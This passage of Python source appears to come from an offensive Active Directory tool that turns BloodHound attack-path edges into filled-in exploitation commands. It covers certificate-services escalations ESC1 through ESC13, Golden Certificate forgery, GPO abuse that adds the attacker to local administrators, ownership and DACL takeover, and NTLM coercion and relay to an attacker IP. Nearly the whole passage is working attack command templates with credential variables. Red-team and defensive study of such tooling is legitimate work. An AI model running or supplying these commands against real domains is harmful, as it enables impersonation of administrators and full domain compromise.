                f"Enrollment right on certificate template/CA {TF}. Combine with a vulnerable template (ESC1/2/3/...) for escalation.",
                [
                    "# Find vulnerable templates:",
                    f"certipy find -u '{A}@{D}' -p '{PASS}' -dc-ip {DC} -vulnerable -stdout",
                    "# Then request a cert (ESC1 example, requires SAN supplyable):",
                    f"certipy req -u '{A}@{D}' -p '{PASS}' -ca '<CA_NAME>' -template '<TEMPLATE>' -upn 'Administrator@{D}' -dc-ip {DC}",
                ],
            ), na

        case "WritePKINameFlag" | "WritePKIEnrollmentFlag":
            return CommandSet(
                f"Modify enrollment/name flag on template {TF} to enable SAN-based impersonation (ESC4 → ESC1).",
                [
                    f"certipy template -u '{A}@{D}' -p '{PASS}' -template '{T}' -write-default-configuration -dc-ip {DC}",
                    f"certipy req -u '{A}@{D}' -p '{PASS}' -ca '<CA_NAME>' -template '{T}' -upn 'Administrator@{D}' -dc-ip {DC}",
                    "# Restore the template afterwards:",
                    f"certipy template -u '{A}@{D}' -p '{PASS}' -template '{T}' -write-configuration '<BACKUP_JSON>' -dc-ip {DC}",
                ],
            ), na

        case "ManageCA" | "ManageCertificates" | "DelegatedEnrollmentAgent":
            return CommandSet(
                f"CA management/officer right on {TF} — approve a denied request or issue arbitrary certs.",
                [
                    "# Inspect the CA's enabled templates:",
                    f"certipy ca -u '{A}@{D}' -p '{PASS}' -ca '{T}' -list-templates -dc-ip {DC}",
                    "# Approve a known pending/denied request ID:",
                    f"certipy ca -u '{A}@{D}' -p '{PASS}' -ca '{T}' -issue-request <REQ_ID> -dc-ip {DC}",
                    "# Or add yourself as Officer to enable approve/issue:",
                    f"certipy ca -u '{A}@{D}' -p '{PASS}' -ca '{T}' -add-officer '{A}' -dc-ip {DC}",
                ],
            ), na

        case "ADCSESC1":
            return CommandSet(
                f"ADCS ESC1 reaches {TF}: enroll through the calculated vulnerable template and CA.",
                [
                    f"certipy req -u '{A}@{D}' -p '{PASS}' -ca '{CA_NAME}' -template '{TEMPLATE}' -upn 'Administrator@{D}' -sid '<ADMINISTRATOR_SID>' -dc-ip {DC}",
                    f"certipy auth -pfx 'administrator.pfx' -domain {D} -dc-ip {DC}",
                ],
                ["Use the CA and template from the ESC1 edge evidence; the edge destination is the affected domain."],
            ), na

        case "ADCSESC3":
            return CommandSet(
                f"ADCS ESC3 — Enrollment Agent template on {TF}. Request agent cert then on-behalf-of Administrator.",
                [
                    f"certipy req -u '{A}@{D}' -p '{PASS}' -ca '{CA_NAME}' -template '{AGENT_TEMPLATE}' -dc-ip {DC}",
                    f"certipy req -u '{A}@{D}' -p '{PASS}' -ca '{CA_NAME}' -template '{TEMPLATE}' -on-behalf-of '{D}\\Administrator' -pfx '{A}.pfx' -dc-ip {DC}",
                    f"certipy auth -pfx 'administrator.pfx' -domain {D} -dc-ip {DC}",
                ],
            ), na

        case "ADCSESC4":
            return CommandSet(
                f"ADCS ESC4 — write rights over template {TF}. Make it ESC1-vulnerable then enroll.",
                [
                    f"certipy template -u '{A}@{D}' -p '{PASS}' -template '{TEMPLATE}' -write-default-configuration -dc-ip {DC}",
                    f"certipy req -u '{A}@{D}' -p '{PASS}' -ca '{CA_NAME}' -template '{TEMPLATE}' -upn 'Administrator@{D}' -sid '<ADMINISTRATOR_SID>' -dc-ip {DC}",
                    "# Restore template:",
                    f"certipy template -u '{A}@{D}' -p '{PASS}' -template '{TEMPLATE}' -write-configuration '<BACKUP_JSON>' -dc-ip {DC}",
                ],
            ), na

        case "ADCSESC6a" | "ADCSESC6b":
            return CommandSet(
                f"ADCS ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 set on CA {TF}. Any client cert template enrollment lets you supply a SAN.",
                [
                    f"certipy req -u '{A}@{D}' -p '{PASS}' -ca '{CA_NAME}' -template '{TEMPLATE}' -upn 'Administrator@{D}' -sid '<ADMINISTRATOR_SID>' -dc-ip {DC}",
                    f"certipy auth -pfx 'administrator.pfx' -domain {D} -dc-ip {DC}",
                ],
            ), na

        case "ADCSESC9a" | "ADCSESC9b":
            return CommandSet(
                f"ADCS ESC9 — no security extension on template {TF}. Combine with GenericWrite on victim to swap UPN/dnsHostName.",
                [
                    "# 1. Set victim's UPN to Administrator (or dnsHostName for ESC9b):",
                    f"certipy account update -u '{A}@{D}' -p '{PASS}' -user '<VICTIM>' -upn 'Administrator' -dc-ip {DC}",
                    "# 2. Enroll using victim:",
                    f"certipy req -u '<VICTIM>@{D}' -p '<VICTIM_PASS>' -ca '{CA_NAME}' -template '{TEMPLATE}' -dc-ip {DC}",
                    "# 3. Restore UPN, then auth:",
                    f"certipy account update -u '{A}@{D}' -p '{PASS}' -user '<VICTIM>' -upn '<ORIGINAL_UPN>' -dc-ip {DC}",
                    f"certipy auth -pfx '<VICTIM>.pfx' -domain {D} -dc-ip {DC}",
                ],
            ), na

        case "ADCSESC10a" | "ADCSESC10b":
            return CommandSet(
                "ADCS ESC10 — weak certificate mapping on DC. Same workflow as ESC9 (UPN/dnsHostName swap).",
                [
                    f"certipy account update -u '{A}@{D}' -p '{PASS}' -user '<VICTIM>' -upn 'Administrator' -dc-ip {DC}",
                    f"certipy req -u '<VICTIM>@{D}' -p '<VICTIM_PASS>' -ca '{CA_NAME}' -template '{TEMPLATE}' -dc-ip {DC}",
                    f"certipy account update -u '{A}@{D}' -p '{PASS}' -user '<VICTIM>' -upn '<ORIGINAL_UPN>' -dc-ip {DC}",
                    f"certipy auth -pfx '<VICTIM>.pfx' -domain {D} -dc-ip {DC}",
                ],
            ), na

        case "ADCSESC13":
            return CommandSet(
                "ADCS ESC13 — issuance policy linked to a group. Cert auth grants implicit group membership.",
                [
                    f"certipy req -u '{A}@{D}' -p '{PASS}' -ca '{CA_NAME}' -template '{TEMPLATE}' -dc-ip {DC}",
                    f"certipy auth -pfx '{A}.pfx' -domain {D} -dc-ip {DC}",
                ],
            ), na

        case "GoldenCert":
            return CommandSet(
                f"Golden Certificate — compromise the CA hosted by {SF}, then forge a certificate trusted by {TF}.",
                [
                    "# 1. Extract CA cert+key from a compromised CA host (mimikatz/SharpDPAPI/certipy):",
                    f"certipy ca -backup -u '{A}@{D}' -p '{PASS}' -ca '{CA_NAME}' -dc-ip {DC}",
                    "# 2. Forge a cert as Administrator:",
                    f"certipy forge -ca-pfx '<CA_BACKUP.pfx>' -upn 'Administrator@{D}' -sid '<ADMINISTRATOR_SID>' -subject 'CN=Administrator,CN=Users,{_fqdn_to_dn(D)}'",
                    f"certipy auth -pfx 'administrator.pfx' -domain {D} -dc-ip {DC}",
                ],
            ), na

        case "WriteGPLink":
            return CommandSet(
                f"WriteGPLink on {TF} — link a malicious GPO to push a payload (scheduled task/local-admin).",
                [
                    "# 1. Create a GPO under your control or compromise an existing one:",
                    "# 2. Link it via gpLink attribute on the OU/domain:",
                    f"bloodyAD --host {DC} -d {D} -u '{A}' -p '{PASS}' set object '{T}' gPLink -v '[LDAP://CN={{<GPO_GUID>}},CN=Policies,CN=System,{_fqdn_to_dn(D)};0]'",
                    "# 3. Push the payload via pygpoabuse:",
                    f"pygpoabuse '{D}/{A}:{PASS}' -gpo-id '<GPO_GUID>' -dc-ip {DC} -command 'net localgroup administrators {A} /add' -taskname 'update'",
                ],
            ), na

        case "OwnsLimitedRights" | "WriteOwnerLimitedRights":
            return CommandSet(
                f"Limited ownership on {TF} (post-2024 Windows hardening). You can still grant FullControl on most objects.",
                [
                    f"owneredit.py -action write -new-owner '{A}' -target '{T}' '{D}/{A}:{PASS}' -dc-ip {DC}",
                    f"dacledit.py -action write -rights FullControl -principal '{A}' -target '{T}' '{D}/{A}:{PASS}' -dc-ip {DC}",
                ],
            ), na

        case "CoerceAndRelayNTLMToSMB" | "CoerceAndRelayNTLMToLDAP" | "CoerceAndRelayNTLMToLDAPS" | "CoerceAndRelayNTLMToADCS":
            relay_target = {
                "CoerceAndRelayNTLMToSMB":   ("smb",   "smb://<RELAY_TARGET>"),
                "CoerceAndRelayNTLMToLDAP":  ("ldap",  "ldap://<RELAY_TARGET>"),
                "CoerceAndRelayNTLMToLDAPS": ("ldaps", "ldaps://<RELAY_TARGET>"),
                "CoerceAndRelayNTLMToADCS":  ("http",  "http://<CA_HOST>/certsrv/certfnsh.asp"),
            }[rel_type]
            return CommandSet(
                f"Coerce {TF} to authenticate, relay NTLM to {relay_target[0].upper()}.",
                [
                    "# 1. Start ntlmrelayx targeting the relay endpoint:",
                    f"impacket-ntlmrelayx -t {relay_target[1]} -smb2support" + (
                        " --escalate-user '" + A + "'" if relay_target[0] == "ldap" or relay_target[0] == "ldaps"
                        else " --adcs --template 'DomainController' " if relay_target[0] == "http" else ""),
                    "# 2. Trigger the coercion (PetitPotam / Coercer / printerbug):",
                    f"coercer coerce -u '{A}' -p '{PASS}' -d {D} -l <ATTACKER_IP> -t {TF}",
                ],
            ), na

        case _:
            return CommandSet(
                f"Edge type '{rel_type}' — consult BloodHound documentation for exploitation steps."
            ), na
